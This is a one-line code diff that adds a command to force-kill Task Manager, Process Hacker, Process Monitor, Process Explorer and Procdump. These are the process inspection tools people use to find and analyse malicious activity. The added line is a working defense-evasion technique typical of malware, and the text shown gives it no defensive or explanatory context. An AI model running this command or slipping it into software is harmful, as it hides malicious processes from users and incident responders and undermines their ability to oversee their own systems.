@@ -1,0 +1,1 @@
+kill -processname Taskmgr, ProcessHacker*, Procmon*, Procexp*, Procdump* -force
